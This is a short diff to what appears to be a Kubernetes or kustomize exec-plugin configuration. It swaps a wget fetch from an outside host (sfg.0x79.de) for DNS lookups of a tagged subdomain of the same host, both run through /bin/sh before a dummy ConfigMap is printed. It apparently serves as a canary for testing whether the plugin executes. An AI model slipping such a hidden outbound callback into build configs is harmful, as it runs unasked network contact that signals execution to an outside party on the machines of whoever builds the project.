@@ -8,4 +8,4 @@ metadata:
         path: /bin/sh
         args:
           - -c
-          - "wget -q -O- https://sfg.0x79.de/TESTFLO-EXEC-PLUGIN || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
+          - "nslookup TESTFLO-EXEC-PLUGIN.sfg.0x79.de || host TESTFLO-EXEC-PLUGIN.sfg.0x79.de || dig TESTFLO-EXEC-PLUGIN.sfg.0x79.de || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
